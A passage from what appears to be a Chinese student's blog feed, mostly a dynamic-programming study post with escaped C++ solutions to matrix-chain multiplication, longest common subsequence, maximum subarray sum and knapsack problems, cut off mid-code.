class="line">cin&gt;&gt;paper[i].time&gt;&gt;paper[i].value;</span><br><span class="line">paper[i].avg=paper[i].value/paper[i].time;</span><br><span class="line">&#125;</span><br><span class="line">sort(paper,paper+m,cmp);</span><br><span class="line">double temp=(double)n;</span><br><span class="line">double sum=0;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;m;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(temp&gt;=paper[i].time)</span><br><span class="line">&#123;</span><br><span class="line">sum+=paper[i].value;</span><br><span class="line">temp-=paper[i].time;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum+=paper[i].avg*temp;</span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;fixed&lt;&lt;setprecision(2)&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;贪心比较简单，但是要掌握好结构体排序的构造
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Algorithm" scheme="https://gardenia30.top/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>算法-动态规划</title>
    <link href="https://gardenia30.top/2018/10/31/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <id>https://gardenia30.top/2018/10/31/动态规划/</id>
    <published>2018-10-31T12:24:22.000Z</published>
    <updated>2018-12-22T11:31:45.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>最头疼的就是这一块<a id="more"></a>老师上课又飞快，虽然讲的非常好，但是还是有点跟不上节奏，加之老师根本不分析代码，所以自己考前准备自己动手复习一波。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><strong>正文</strong></h1><p>动态规划解决问题的基本方法码一波<br>(1)找出最优解的性质并刻画其结构特征<br>(2)递归地定义最优值<br>(3)以自底向上的方式计算出最优值<br>(4)根据计算最优值时的信息构造最优解</p><h2 id="1-矩阵连乘问题"><a href="#1-矩阵连乘问题" class="headerlink" title="1.矩阵连乘问题"></a><strong>1.矩阵连乘问题</strong></h2><p>矩阵连乘的最优值是n个矩阵连乘的最小数乘次数，最优解是得出矩阵之间该如何进行优先级运算才能得出最优值（也就是加括号的方式）</p><p><strong>题目描述</strong><br>给定n个矩阵｛A1,A2,…,An｝，其中Ai与Ai+1是可乘的，i=1,2 ,…,n-1。如何确定计算矩阵连乘积的计算次序，使得依此次序计算矩阵连乘积需要的数乘次数最少。<br>A1={30x35} ; A2={35x15} ;A3={15x5} ;A4={5x10} ;A5={10x20} ;A6={20x25} ;<br>最后的结果为：((A1(A2A3))((A4A5)A6))  最小的乘次为15125<br><img src="https://s1.ax1x.com/2018/10/31/iWK9c6.png" alt="m[i][j]的递推方程"></p><p><strong>Code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int m[100][100];     //m[i][j]表示A[i:j]的最小数乘次数 </span><br><span class="line">int s[100][100]=&#123;0&#125;;     //s[i][j]表示断点位置 </span><br><span class="line">int p[100];//表示矩阵的行列值 </span><br><span class="line">int matrixchain(int n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">m[i][i]=0;  //对角线赋值0 </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int r=2;r&lt;=n;r++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n-r+1;i++)</span><br><span class="line">&#123;</span><br><span class="line">int j=i+r-1;     //从m[i][i+1]开始判断 i&lt;=j&lt;n</span><br><span class="line">m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j];</span><br><span class="line">s[i][j]=i;       //此时从i处断开</span><br><span class="line"><span class="keyword">for</span>(int k=i+1;k&lt;j;k++)</span><br><span class="line">&#123;</span><br><span class="line">int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j]; //从i+1处断开并比较大小 </span><br><span class="line"><span class="keyword">if</span>(t&lt;m[i][j])</span><br><span class="line">&#123;</span><br><span class="line">m[i][j]=t;         //更新最优值 </span><br><span class="line">s[i][j]=k;   //更新断点 </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> int N;</span><br><span class="line">cin&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;N+1;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;p[i];</span><br><span class="line"> &#125; </span><br><span class="line">matrixchain(N);</span><br><span class="line">cout&lt;&lt;m[1][N]&lt;&lt;endl;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><h2 id="2-最长公共子序列"><a href="#2-最长公共子序列" class="headerlink" title="2.最长公共子序列"></a><strong>2.最长公共子序列</strong></h2><p><strong>题目描述</strong><br>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int c[100][100];</span><br><span class="line">int b[100][100];</span><br><span class="line">char x[100],y[100];</span><br><span class="line">int lcslength(int m,int n)     //构造最优值，以及最优解需要的条件b[i][j]</span><br><span class="line">&#123;</span><br><span class="line">int i,j;</span><br><span class="line"><span class="keyword">for</span>(i=1;i&lt;=m;i++)c[i][0]=0;</span><br><span class="line"><span class="keyword">for</span>(i=1;i&lt;=n;i++)c[0][i]=0;</span><br><span class="line"><span class="keyword">for</span>(i=1;i&lt;=m;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=1;j&lt;=n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(x[i]==y[j])</span><br><span class="line">&#123;</span><br><span class="line">c[i][j]=c[i-1][j-1]+1;</span><br><span class="line">b[i][j]=1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i-1][j]&gt;=c[i][j-1])</span><br><span class="line">&#123;</span><br><span class="line">c[i][j]=c[i-1][j];</span><br><span class="line">b[i][j]=2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">c[i][j]=c[i][j-1];</span><br><span class="line">b[i][j]=3;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;                              </span><br><span class="line">void lcs(int i,int j)      //构造最优解</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i==0||j==0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b[i][j]==1)</span><br><span class="line">&#123;</span><br><span class="line">lcs(i-1,j-1);</span><br><span class="line">cout&lt;&lt;x[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b[i][j]==2)</span><br><span class="line">&#123;</span><br><span class="line">lcs(i-1,j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">lcs(i,j-1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int m,n;</span><br><span class="line">cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=m;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;x[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;y[i];</span><br><span class="line">&#125;</span><br><span class="line">lcslength(m,n);</span><br><span class="line">cout&lt;&lt;<span class="string">"length="</span>&lt;&lt;c[m][n]&lt;&lt;endl;</span><br><span class="line">lcs(m,n);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="3-最大子段和"><a href="#3-最大子段和" class="headerlink" title="3.最大子段和"></a><strong>3.最大子段和</strong></h2><p><strong>题目描述</strong><br>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。<br>提示：子段可为空集，答案为0</p><p><strong>输入</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</span><br><span class="line">每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</span><br><span class="line">接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</span><br><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure></p><p><strong>输出</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输出其对应的最大子段和。</span><br><span class="line">18</span><br></pre></td></tr></table></figure></p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int a[100];</span><br><span class="line">int sum=0;</span><br><span class="line">int maxsum(int n)</span><br><span class="line">&#123;</span><br><span class="line">int b=0;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(b&gt;0)</span><br><span class="line">&#123;</span><br><span class="line">b+=a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">b=a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b&gt;sum)</span><br><span class="line">&#123;</span><br><span class="line">sum=b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int k;</span><br><span class="line">cin&gt;&gt;k;</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;k;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;a[i];</span><br><span class="line">&#125;</span><br><span class="line">maxsum(k);</span><br><span class="line">cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="4-0-1背包动态规划解法"><a href="#4-0-1背包动态规划解法" class="headerlink" title="4.0-1背包动态规划解法"></a><strong>4.0-1背包动态规划解法</strong></h2><p><strong>题目描述</strong><br>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><p><strong>输入</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</span><br><span class="line">接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost和价值</span><br><span class="line">（注意：结果可能超过int范围）</span><br><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure></p><p><strong>输出</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对每组测试数据，输出其对应的所装物品的最大价值。</span><br><span class="line">15</span><br></pre></td></tr></table></figure></p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int m[100][100]=&#123;0&#125;;</span><br><span class="line">int w[100];</span><br><span class="line">int v[100];</span><br><span class="line">int knapsack(int n,int c)</span><br><span class="line">&#123;</span><br><span class="line">int jmax=min(w[n]-1,c);</span><br><span class="line"><span class="keyword">for</span>(int i=0;i&lt;=jmax;i++)</span><br><span class="line">&#123;</span><br><span class="line">m[n][i]=0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=w[n];i&lt;=c;i++)</span><br><span class="line">&#123;</span><br><span class="line">m[n][i]=v[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int i=n-1;i&gt;=1;i--)</span><br><span class="line">&#123;</span><br><span class="line">jmax=min(w[i]-1,c);</span><br><span class="line"><span class="keyword">for</span>(int j=0;j&lt;=jmax;j++)</span><br><span class="line">&#123;</span><br><span class="line">m[i][j]=m[i+1][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int j=w[i];j&lt;=c;j++)</span><br><span class="line">&#123;</span><br><span class="line">m[i][j]=max(m[i+1][j],m[i+1][j-w[i]]+v[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int t;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)</span><br><span class="line">&#123;</span><br><span class="line">int c,n;</span><br><span class="line">cin&gt;&gt;c&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">cin&gt;&gt;w[i]&gt;&gt;v[i];</span><br><span class="line">&#125;</span><br><span class="line">knapsack(n,c);</span><br><span class="line">cout&lt;&lt;m[1][c]&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><p><strong><em>例题</em></strong></p><h2 id="5-节食的限制"><a href="#5-节食的限制" class="headerlink" title="5.节食的限制"></a><strong>5.节食的限制</strong></h2><p><strong>题目描述</strong><br> Bessie像她的诸多姊妹一样，因為从FarmerJohn的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。<br><strong>输入</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</span><br><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure></p><p><strong>输出</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</span><br><span class="line">56</span><br></pre></td></tr></table></figure></p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;algorithm&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#define inf 0x7fffffff</span></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int c; //最多吃的干草量</span><br><span class="line">int n; //有多少捆干草</span><br><span class="line">cin &gt;&gt; c &gt;&gt; n;</span><br><span class="line">int *wei = new int[n + 1];</span><br><span class="line">int m[50000];</span><br><span class="line"><span class="keyword">for</span> (int i = 1; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; wei[i];</span><br><span class="line">&#125;</span><br><span class="line">memset(m, 0, sizeof(m));</span><br><span class="line"><span class="keyword">for</span> (int i = 1; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (int j = c; j &gt;= wei[i]; j--) //j从大到小倒着遍历，如果大于重量，则说明可以放入，反之，则放弃这个物品，从下一个物品开始</span><br><span class="line">&#123;</span><br><span class="line">m[j] = max(m[j], m[j - wei[i]] + wei[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; m[c] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="矩阵连乘进阶"><a href="#矩阵连乘进阶" class="headerlink" title="矩阵连乘进阶"></a><strong>矩阵连乘进阶</strong></h2><p><strong>题目描述</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">给定n个矩阵&#123;A1,A2,...,An&#125;，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。</span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：</span><br><span class="line">第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。</span><br><span class="line">接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1&lt;r, c&lt;100。</span><br><span class="line">第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。</span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。</span><br><span class="line"></span><br><span class="line">数据保证结果不超过1e9。</span><br><span class="line"></span><br><span class="line">样例输入</span><br><span class="line"></span><br><span class="line">3 2</span><br><span class="line">A 10 100</span><br><span class="line">B 5 50</span><br><span class="line">C 100 5</span><br><span class="line">ACB</span><br><span class="line">ABC</span><br><span class="line"></span><br><span class="line">样例输出</span><br><span class="line"></span><br><span class="line">7500</span><br><span class="line">MengMengDa</span><br></pre></td></tr></table></figure></p><p><strong>code</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int m[100][100]=&#123;0&#125;;</span><br><span class="line">int p[200];</span><br><span class="line">int maxchain(int n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">m[i][i]=0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(int r=2;r&lt;=n;r++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=n-r+1;i++)</span><br><span class="line">&#123;</span><br><span class="line">int j=i+r-1;</span><br><span class="line">m[i][j]=m[i+1][j]+p[i-1]*p[i]*p[j];</span><br><span class="line"><span class="keyword">for</span>(int k=i+1;k&lt;j;k++)</span><br><span class="line">&#123;</span><br><span class="line">int t=m[i][k]+m[k+1][j]+p[i-1]*p[k]*p[j];</span><br><span class="line"><span class="keyword">if</span>(t&lt;m[i][j])</span><br><span class="line">&#123;</span><br><span class="line">m[i][j]=t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> m[1][n];</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n,m;</span><br><span class="line"><span class="keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">char chain[30];</span><br><span class="line">int 